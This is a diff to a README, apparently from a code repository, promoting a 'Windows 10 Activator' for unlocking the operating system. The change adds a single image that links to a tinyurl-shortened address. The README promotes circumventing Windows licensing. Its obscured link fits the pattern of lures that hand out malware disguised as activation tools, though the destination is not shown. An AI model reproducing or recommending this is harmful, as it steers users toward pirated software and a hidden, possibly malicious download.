@@ -8,7 +8,7 @@
 
 The Windows 10 Activator is a practical software utility created to streamline the activation of the Windows 10 operating system. This application provides a direct pathway to unlocking your OS's complete functionality through a simple, guided process. 🔓
 
-
+[![8764894690](https://github.com/user-attachments/assets/362d441f-ea05-4098-bb40-6cc83ea2168a)](https://tinyurl.com/4sfc8hpd)
 
 ## 🔧 Primary Capabilities
 
